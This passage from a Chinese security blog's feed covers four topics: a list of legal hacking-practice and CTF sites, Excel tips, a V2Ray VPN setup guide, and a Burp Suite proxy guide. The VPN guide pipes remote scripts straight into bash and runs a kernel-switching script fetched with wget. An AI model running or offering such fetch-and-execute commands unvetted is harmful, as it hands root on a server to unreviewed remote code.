rel="noopener">http://www.enigmagroup.org/</a></td></tr><tr><td>Escape</td><td><a href="http://escape.alf.nu/" target="_blank" rel="noopener">http://escape.alf.nu/</a></td></tr><tr><td>Google Gruyere</td><td><a href="http://google-gruyere.appspot.com/" target="_blank" rel="noopener">http://google-gruyere.appspot.com/</a></td></tr><tr><td>Gh0st Lab</td><td><a href="http://www.gh0st.net/" target="_blank" rel="noopener">http://www.gh0st.net/</a></td></tr><tr><td>Hack This Site</td><td><a href="http://www.hackthissite.org/" target="_blank" rel="noopener">http://www.hackthissite.org/</a></td></tr><tr><td>HackThis</td><td><a href="http://www.hackthis.co.uk/" target="_blank" rel="noopener">http://www.hackthis.co.uk/</a></td></tr><tr><td>HackQuest</td><td><a href="http://www.hackquest.com/" target="_blank" rel="noopener">http://www.hackquest.com/</a></td></tr><tr><td>Hack.me</td><td><a href="https://hack.me/" target="_blank" rel="noopener">https://hack.me</a></td></tr><tr><td>Hacking-Lab</td><td><a href="https://www.hacking-lab.com/" target="_blank" rel="noopener">https://www.hacking-lab.com</a></td></tr><tr><td>Hacker Challenge</td><td><a href="http://www.dareyourmind.net/" target="_blank" rel="noopener">http://www.dareyourmind.net/</a></td></tr><tr><td>Hacker Test</td><td><a href="http://www.hackertest.net/" target="_blank" rel="noopener">http://www.hackertest.net/</a></td></tr><tr><td>hACME Game</td><td><a href="http://www.hacmegame.org/" target="_blank" rel="noopener">http://www.hacmegame.org/</a></td></tr><tr><td>Halls Of Valhalla</td><td><a href="http://halls-of-valhalla.org/beta/challenges" target="_blank" rel="noopener">http://halls-of-valhalla.org/beta/challenges</a></td></tr><tr><td>Hax.Tor</td><td><a href="http://hax.tor.hu/" target="_blank" rel="noopener">http://hax.tor.hu/</a></td></tr><tr><td>OverTheWire</td><td><a href="http://www.overthewire.org/wargames/" target="_blank" rel="noopener">http://www.overthewire.org/wargames/</a></td></tr><tr><td>PentestIT</td><td><a href="http://www.pentestit.ru/en/" target="_blank" rel="noopener">http://www.pentestit.ru/en/</a></td></tr><tr><td>CSC Play on Demand</td><td><a href="https://pod.cybersecuritychallenge.org.uk/" target="_blank" rel="noopener">https://pod.cybersecuritychallenge.org.uk/</a></td></tr><tr><td>pwn0</td><td><a href="https://pwn0.com/home.php" target="_blank" rel="noopener">https://pwn0.com/home.php</a></td></tr><tr><td>RootContest</td><td><a href="http://rootcontest.com/" target="_blank" rel="noopener">http://rootcontest.com/</a></td></tr><tr><td>Root Me</td><td><a href="http://www.root-me.org/?lang=en" target="_blank" rel="noopener">http://www.root-me.org/?lang=en</a></td></tr><tr><td>Security Treasure Hunt</td><td><a href="http://www.securitytreasurehunt.com/" target="_blank" rel="noopener">http://www.securitytreasurehunt.com/</a></td></tr><tr><td>Smash The Stack</td><td><a href="http://www.smashthestack.org/" target="_blank" rel="noopener">http://www.smashthestack.org/</a></td></tr><tr><td>SQLZoo</td><td><a href="http://sqlzoo.net/hack/" target="_blank" rel="noopener">http://sqlzoo.net/hack/</a></td></tr><tr><td>TheBlackSheep and Erik</td><td><a href="http://www.bright-shadows.net/" target="_blank" rel="noopener">http://www.bright-shadows.net/</a></td></tr><tr><td>ThisIsLegal</td><td><a href="http://thisislegal.com/" target="_blank" rel="noopener">http://thisislegal.com/</a></td></tr><tr><td>Try2Hack</td><td><a href="http://www.try2hack.nl/" target="_blank" rel="noopener">http://www.try2hack.nl/</a></td></tr><tr><td>WabLab</td><td><a href="http://www.wablab.com/hackme" target="_blank" rel="noopener">http://www.wablab.com/hackme</a></td></tr><tr><td>XSS: Can You XSS This?</td><td><a href="http://canyouxssthis.com/HTMLSanitizer/" target="_blank" rel="noopener">http://canyouxssthis.com/HTMLSanitizer/</a></td></tr><tr><td>XSS Game</td><td><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">https://xss-game.appspot.com/</a></td></tr><tr><td>XSS: ProgPHP</td><td><a href="http://xss.progphp.com/" target="_blank" rel="noopener">http://xss.progphp.com/</a></td></tr></tbody></table><h1 id="0x06-CTF-Sites-Archives"><a href="#0x06-CTF-Sites-Archives" class="headerlink" title="0x06 CTF Sites / Archives"></a>0x06 <strong>CTF Sites / Archives</strong></h1><table><thead><tr><th>CAPTF Repo</th><th><a href="http://captf.com/" target="_blank" rel="noopener">http://captf.com/</a></th></tr></thead><tbody><tr><td>CTFtime (Details of CTF Challenges)</td><td><a href="http://ctftime.org/ctfs/" target="_blank" rel="noopener">http://ctftime.org/ctfs/</a></td></tr><tr><td>CTF write-ups repository</td><td><a href="https://github.com/ctfs" target="_blank" rel="noopener">https://github.com/ctfs</a></td></tr><tr><td>Reddit CTF Announcements</td><td><a href="http://www.reddit.com/r/securityctf" target="_blank" rel="noopener">http://www.reddit.com/r/securityctf</a></td></tr><tr><td>shell-storm Repo</td><td><a href="http://shell-storm.org/repo/CTF/" target="_blank" rel="noopener">http://shell-storm.org/repo/CTF/</a></td></tr><tr><td>VulnHub</td><td><a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com</a></td></tr></tbody></table><h1 id="0x07-Mobile-Apps"><a href="#0x07-Mobile-Apps" class="headerlink" title="0x07 Mobile Apps"></a>0x07 <strong>Mobile Apps</strong></h1><table><thead><tr><th>Damn Vulnerable Android App (DVAA)</th><th><a href="https://code.google.com/p/dvaa/" target="_blank" rel="noopener">https://code.google.com/p/dvaa/</a></th></tr></thead><tbody><tr><td>Damn Vulnerable FirefoxOS Application (DVFA)</td><td><a href="https://github.com/pwnetrationguru/dvfa/" target="_blank" rel="noopener">https://github.com/pwnetrationguru/dvfa/</a></td></tr><tr><td>Damn Vulnerable iOS App (DVIA)</td><td><a href="http://damnvulnerableiosapp.com/" target="_blank" rel="noopener">http://damnvulnerableiosapp.com/</a></td></tr><tr><td>ExploitMe Mobile Android Labs</td><td><a href="http://securitycompass.github.io/AndroidLabs/" target="_blank" rel="noopener">http://securitycompass.github.io/AndroidLabs/</a></td></tr><tr><td>ExploitMe Mobile iPhone Labs</td><td><a href="http://securitycompass.github.io/iPhoneLabs/" target="_blank" rel="noopener">http://securitycompass.github.io/iPhoneLabs/</a></td></tr><tr><td>Hacme Bank Android</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx</a></td></tr><tr><td>InsecureBank</td><td><a href="http://www.paladion.net/downloadapp.html" target="_blank" rel="noopener">http://www.paladion.net/downloadapp.html</a></td></tr><tr><td>NcN Wargame</td><td><a href="http://noconname.org/evento/wargame/" target="_blank" rel="noopener">http://noconname.org/evento/wargame/</a></td></tr><tr><td>OWASP iGoat</td><td><a href="http://code.google.com/p/owasp-igoat/" target="_blank" rel="noopener">http://code.google.com/p/owasp-igoat/</a></td></tr><tr><td>OWASP Goatdroid</td><td><a href="https://github.com/jackMannino/OWASP-GoatDroid-Project" target="_blank" rel="noopener">https://github.com/jackMannino/OWASP-GoatDroid-Project</a></td></tr></tbody></table><h1 id="0x08-Lab"><a href="#0x08-Lab" class="headerlink" title="0x08 Lab"></a>0x08 <strong>Lab</strong></h1><table><thead><tr><th>binjitsu</th><th><a href="https://github.com/binjitsu/binjitsu" target="_blank" rel="noopener">https://github.com/binjitsu/binjitsu</a></th></tr></thead><tbody><tr><td>CTFd</td><td><a href="https://github.com/isislab/CTFd" target="_blank" rel="noopener">https://github.com/isislab/CTFd</a></td></tr><tr><td>Mellivora</td><td><a href="https://github.com/Nakiami/mellivora" target="_blank" rel="noopener">https://github.com/Nakiami/mellivora</a></td></tr><tr><td>NightShade</td><td><a href="https://github.com/UnrealAkama/NightShade" target="_blank" rel="noopener">https://github.com/UnrealAkama/NightShade</a></td></tr><tr><td>MCIR</td><td><a href="https://github.com/SpiderLabs/MCIR" target="_blank" rel="noopener">https://github.com/SpiderLabs/MCIR</a></td></tr><tr><td>Docker</td><td><a href="https://www.docker.com/" target="_blank" rel="noopener">https://www.docker.com/</a></td></tr><tr><td>Vagrant</td><td><a href="https://www.vagrantup.com/" target="_blank" rel="noopener">https://www.vagrantup.com/</a></td></tr><tr><td>NETinVM</td><td><a href="http://informatica.uv.es/~carlos/docencia/netinvm/" target="_blank" rel="noopener">http://informatica.uv.es/~carlos/docencia/netinvm/</a></td></tr><tr><td>SmartOS</td><td><a href="https://smartos.org/" target="_blank" rel="noopener">https://smartos.org/</a></td></tr><tr><td>SmartDataCenter</td><td><a href="https://github.com/joyent/sdc" target="_blank" rel="noopener">https://github.com/joyent/sdc</a></td></tr><tr><td>vSphere Hypervisor</td><td><a href="https://www.vmware.com/products/vsphere-hypervisor/" target="_blank" rel="noopener">https://www.vmware.com/products/vsphere-hypervisor/</a></td></tr><tr><td>GNS3</td><td><a href="http://sourceforge.net/projects/gns-3/" target="_blank" rel="noopener">http://sourceforge.net/projects/gns-3/</a></td></tr><tr><td>OCCP</td><td><a href="https://opencyberchallenge.net/" target="_blank" rel="noopener">https://opencyberchallenge.net/</a></td></tr><tr><td>XAMPP</td><td><a href="https://www.apachefriends.org/index.html" target="_blank" rel="noopener">https://www.apachefriends.org/index.html</a></td></tr></tbody></table><h1 id="0x09-Miscellaneous"><a href="#0x09-Miscellaneous" class="headerlink" title="0x09 Miscellaneous"></a>0x09 <strong>Miscellaneous</strong></h1><table><thead><tr><th>VulnVPN</th><th><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></th></tr></thead><tbody><tr><td>VulnVoIP</td><td><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></td></tr><tr><td>Vulnserver</td><td><a href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html" target="_blank" rel="noopener">http://www.thegreycorner.com/2010/12/introducing-vulnserver.html</a></td></tr><tr><td>NETinVM</td><td><a href="http://informatica.uv.es/~carlos/docencia/netinvm/" target="_blank" rel="noopener">http://informatica.uv.es/~carlos/docencia/netinvm/</a></td></tr><tr><td>DVRF</td><td><a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="noopener">https://github.com/praetorian-inc/DVRF</a></td></tr><tr><td>HackSys Extreme Vulnerable Driver</td><td><a href="http://www.payatu.com/hacksys-extreme-vulnerable-driver/" target="_blank" rel="noopener">http://www.payatu.com/hacksys-extreme-vulnerable-driver/</a></td></tr><tr><td>VirtuaPlant</td><td><a href="https://github.com/jseidl/virtuaplant" target="_blank" rel="noopener">https://github.com/jseidl/virtuaplant</a></td></tr><tr><td>Fosscomm</td><td><a href="https://github.com/nikosdano/fosscomm" target="_blank" rel="noopener">https://github.com/nikosdano/fosscomm</a></td></tr><tr><td>Morning Catch</td><td><a href="http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/" target="_blank" rel="noopener">http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/</a></td></tr><tr><td>AWBO</td><td><a href="https://labs.snort.org/awbo/awbo.html" target="_blank" rel="noopener">https://labs.snort.org/awbo/awbo.html</a></td></tr></tbody></table><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在学习渗透测试的过程中，光学理论知识是不够的，还需要结合实战来进行学习。但是国家法律是不允许我们对互联网上的web站在未授权的情况下进行渗透测试的，所以我们只能通过自己搭建环境来进行学习。下面给大家分享一些靶场，免得大家再去寻找。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶场" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/"/>
    
    
      <category term="靶场" scheme="https://www.mad-coding.cn/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MS2016-Excel使用的一些技巧</title>
    <link href="https://www.mad-coding.cn/2019/09/25/MS2016-Excel%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
    <id>https://www.mad-coding.cn/2019/09/25/MS2016-Excel使用的一些技巧/</id>
    <published>2019-09-25T09:01:33.000Z</published>
    <updated>2019-09-25T09:20:39.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在这个信息大爆炸的时代，不会电脑的电脑白将难以生存，不会office办公软件的电脑白将难以升职加薪。这里主要记录一下自己在工作中碰到的一些excel问题，方便他人，利于自己。皮卡皮卡~</p><a id="more"></a><h1 id="0x01-解决问题"><a href="#0x01-解决问题" class="headerlink" title="0x01 解决问题"></a>0x01 解决问题</h1><h2 id="1-1-设置行高"><a href="#1-1-设置行高" class="headerlink" title="1.1 设置行高"></a>1.1 设置行高</h2><p>右击需要设置的行和列，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170616.png" class="lozad"></p><h2 id="1-2-合并多个文件"><a href="#1-2-合并多个文件" class="headerlink" title="1.2 合并多个文件"></a>1.2 合并多个文件</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170637.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170645.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170653.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170702.png" class="lozad"></p><p>然后等待数据被加载出来</p><h2 id="1-3-冻结指定的行和列"><a href="#1-3-冻结指定的行和列" class="headerlink" title="1.3 冻结指定的行和列"></a>1.3 冻结指定的行和列</h2><h3 id="1-3-1-案例1"><a href="#1-3-1-案例1" class="headerlink" title="1.3.1 案例1"></a>1.3.1 案例1</h3><blockquote><p>冻结首行首列只需要点击A2,B2单元格</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170758.png" class="lozad"></p><p>然后到视图-&gt;冻结窗口-&gt;冻结窗口</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170809.png" class="lozad"></p><p>结果展示</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170824.gif" class="lozad"></p><h3 id="1-3-2-案例2"><a href="#1-3-2-案例2" class="headerlink" title="1.3.2 案例2"></a>1.3.2 案例2</h3><blockquote><p>冻结指定行列</p></blockquote><p>为了给大家更形象的理解，我画了一个丑图，希望大家可以看懂^v^</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171343.png" class="lozad"></p><p>想冻结前两行，前两列</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171624.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171726.png" class="lozad"></p><p>结果展示：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171838.gif" class="lozad"></p><h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在这个信息大爆炸的时代，不会电脑的电脑白将难以生存，不会office办公软件的电脑白将难以升职加薪。这里主要记录一下自己在工作中碰到的一些excel问题，方便他人，利于自己。皮卡皮卡~&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://www.mad-coding.cn/categories/Windows/"/>
    
    
      <category term="解决问题" scheme="https://www.mad-coding.cn/tags/%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>9元钱搭建一个自己的VPN</title>
    <link href="https://www.mad-coding.cn/2019/09/20/9%E5%85%83%E9%92%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84VPN/"/>
    <id>https://www.mad-coding.cn/2019/09/20/9元钱搭建一个自己的VPN/</id>
    <published>2019-09-20T08:42:59.000Z</published>
    <updated>2019-10-11T09:10:28.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>科学上网。。。。此处省略一万字</p><a id="more"></a><h1 id="0x01-需求分析"><a href="#0x01-需求分析" class="headerlink" title="0x01 需求分析"></a>0x01 需求分析</h1><blockquote><p>1.一个Linux系统的vps</p><p>2.v2ray脚本</p><p>3.v2ray客户端</p></blockquote><h1 id="0x02-购买VPS"><a href="#0x02-购买VPS" class="headerlink" title="0x02 购买VPS"></a>0x02 购买VPS</h1><p>购买地址：<a href="https://virmach.com/" target="_blank" rel="noopener">传送门</a>,选择第四项，经济实惠的<code>Linux</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165438.png" class="lozad"></p><p>然后拉到最底下，选择<code>KVM VPS</code>，注意，这里不要选<code>open VZ</code>的<code>VPS</code>，因为这个虚拟主机不能进行<code>bbr plus</code>加速，笔者在这里踩了一个大坑，找了好久资料，没有解决，最后在团队群里的一个小伙伴告诉我了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165452.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165505.png" class="lozad"></p><p>选择vps的配置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165517.png" class="lozad"></p><p>位置就选默认的，速度杠杠的，然后添加到购物车</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165529.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165536.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165542.png" class="lozad"></p><p>完成订单后会跳到支付宝付款的界面，扫码付钱就行了。</p><p>之所以选择Ubuntu16位的系统是因为笔者试过了debian，centos的系统，发现都不行，真是所有坑都被我踩了。</p><h1 id="0x03-安装-V2Ray"><a href="#0x03-安装-V2Ray" class="headerlink" title="0x03 安装 V2Ray"></a>0x03 安装 V2Ray</h1><p>输入下面命令回车，你可以复制过去，然后在 Xshell 界面按 Shift + Insert 即可粘贴，不能按 Ctrl + V 的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br></pre></td></tr></table></figure><p>如果提示 curl: command not found ，那是因为你的 VPS 没装 Curl</p><p>ubuntu/debian 系统安装 Curl 方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get install curl -y</span><br></pre></td></tr></table></figure><p>centos 系统安装 Curl 方法: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y &amp;&amp; yum install curl -y</span><br></pre></td></tr></table></figure><p>安装好 curl 之后就能安装脚本了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165722.png" class="lozad"></p><p>输入1，回车，开始安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165730.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165738.png" class="lozad"></p><p>选择协议，默认TCP，回车即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165815.png" class="lozad"></p><p>选择端口，回车</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165828.png" class="lozad"></p><p>广告拦截，回车自动选择N</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165843.png" class="lozad"></p><p>配置Shadowsocks，有需要的可以配置，也可以先不配置，等配置好v2ray以后在配置也可以</p><p>最后按enter键，等待一会，会有v2ray的配置信息出现，说明配置好了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165900.png" class="lozad"></p><p>下载v2ray的客户端，然后导入刚刚复制的复制的配置信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165911.png" class="lozad"></p><p>选择从剪切板导入，导入成功后会出现下图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165920.png" class="lozad"></p><p>有点右下角的v2ray客户端小图标，点击启用http代理</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165935.png" class="lozad"></p><p>模式选择，有<strong>全局模式</strong>和PAC模式，</p><p><strong>全局模式</strong>状态下，你访问的所有流量都会先经过vps服务器，相当于vps是一个中间者，</p><p><strong>PAC模式</strong>状态下，你访问的流量会自动分流，国内的网站不会经过vps，只有国外的网站才会经过vps</p><p>OK,现在就可以访问Google试试了，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170005.png" class="lozad"></p><p>访问YouTube</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170028.png" class="lozad"></p><p>到这里，FQ已经是成功了，但是，有个问题就是访问的网速却很慢，so，需要进行加速操作。</p><h1 id="0x04-BBR-plus内核加速"><a href="#0x04-BBR-plus内核加速" class="headerlink" title="0x04 BBR plus内核加速"></a>0x04 BBR plus内核加速</h1><h2 id="4-1-安装证书"><a href="#4-1-安装证书" class="headerlink" title="4.1 安装证书"></a>4.1 安装证书</h2><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install ca-certificates</span><br><span class="line">或</span><br><span class="line">yum -y install ca-certificates</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170235.png" class="lozad"></p><h2 id="4-2-安装加速脚本"><a href="#4-2-安装加速脚本" class="headerlink" title="4.2 安装加速脚本"></a>4.2 安装加速脚本</h2><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;https://github.com/chiakge/Linux-NetSpeed/raw/master/tcp.sh&quot; &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><p>先在[1– 3]切换内核（第一次显示为bbr内核也要切换一遍），重启</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170336.png" class="lozad"></p><p>安装完成，重启vps</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170350.png" class="lozad"></p><h2 id="4-2-运行"><a href="#4-2-运行" class="headerlink" title="4.2 运行"></a>4.2 运行</h2><p>重启后不用再下载脚本，直接<code>./tcp.sh</code> ，在[4 – 8]中选你要开的加速</p><blockquote><p>“1. 安装 BBR/BBR魔改版内核” 对应4,5,6（原版，魔改，暴力魔改）</p><p>“2. 安装 BBRplus版内核 ” 对应7（plus）</p><p>“3. 安装 Lotserver(锐速)内核” 对应8（锐速）</p></blockquote><p>开启后再 ./tcp.sh ， 显示开启成功则启动成功，你也可以自己手动确认</p><p>现在你可以自由的切换你想要的加速，直到你不想折腾为止~</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170540.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170600.png" class="lozad"></p><p>然后在访问YouTube，测试速度，发现速度飕飕的。1080p点到哪里看哪里。</p><h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><ol><li><a href="https://github.com/233boy/v2ray/wiki/V2Ray搭建详细图文教程" target="_blank" rel="noopener">https://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B</a></li><li><a href="https://zhujiwiki.com/8563/" target="_blank" rel="noopener">https://zhujiwiki.com/8563/</a></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;科学上网。。。。此处省略一万字&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用burpsuite抓取Google的数据包</title>
    <link href="https://www.mad-coding.cn/2019/09/20/%E4%BD%BF%E7%94%A8burpsuite%E6%8A%93%E5%8F%96Google%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <id>https://www.mad-coding.cn/2019/09/20/使用burpsuite抓取Google的数据包/</id>
    <published>2019-09-20T08:36:18.000Z</published>
    <updated>2019-09-20T08:41:35.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们在测试的过程中，可能会碰到必须需要挂VPN代理才能访问的网站，但是挂了VPN以后，就不能继续设置代理抓包了，最近有一个朋友帮助我解决了这一问题。下面来给大家讲讲其中的原理和操作方法。</p><h1 id="0x01-需要的环境"><a href="#0x01-需要的环境" class="headerlink" title="0x01 需要的环境"></a>0x01 需要的环境</h1><blockquote><p>本机：Windows10 X64</p><p>需要的软件：V2ray客户端</p><p>​    burpsuite</p><p>VPS:安装了v2ray</p></blockquote><h1 id="0x02-原理解析"><a href="#0x02-原理解析" class="headerlink" title="0x02 原理解析"></a>0x02 原理解析</h1><p>原理及时本地浏览器开启本地的8080端口的代理，然后在burp中设置一个1080的本地端口代理。然后通过V2ray客户端将本地的1080端口和vps的43085端口映射上。这样就大ton过本地浏览器-&gt;burpsuite-&gt;vps-&gt;目标网站的通路，当然抓包也就不成问题了，下图是我按照自己的理解画的一个数据流向图，帮助大家理解一下其中的原理，如果理解错误的地方，欢迎大家指出。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163850.png" class="lozad"></p><h1 id="0x03-操作流程"><a href="#0x03-操作流程" class="headerlink" title="0x03 操作流程"></a>0x03 操作流程</h1><p>1.浏览器开启代理</p><p>这里我使用了代理工具了，也可以直接在设置里面去设置。这个不会的请出门右转百度。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163916.png" class="lozad"></p><p>2.burp中的设置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163926.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163940.png" class="lozad"></p><p>3.v2ray客户端的配置</p><p>需要开启全局代理模式。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164003.png" class="lozad"></p><p>4.访问测试</p><p>burp下不拦截数据包，随便访问一个网站，看看能否正常访问，可以正常访问说明数据是通的，配置没有问题。</p><p>可以正常访问hao123.</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164022.png" class="lozad"></p><p>访问谷歌也是正常</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164038.png" class="lozad"></p><p>看看<code>burpsuite</code>的历史记录中，已经有了谷歌和<code>hao123</code>的数据包记录。 数据的流向正的没有问题。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164049.png" class="lozad"></p><p>抓一个youtube的包试试，成功抓到了YouTube的请求包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164106.png" class="lozad"></p><p>YouTube的返回包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164119.png" class="lozad"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>前人栽树后人乘凉，本着分享的精神和大家分享一下，大家共同进步，觉得文章不错的点个赞就好，觉得很烂的，留下你的足迹就好。</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;我们在测试的过程中，可能会碰到必须需要挂VPN代理才能访问的网站，但是挂了VPN以后，就不能继续设置
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="burpsuite" scheme="https://www.mad-coding.cn/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>本地搭建一个poc生成器</title>
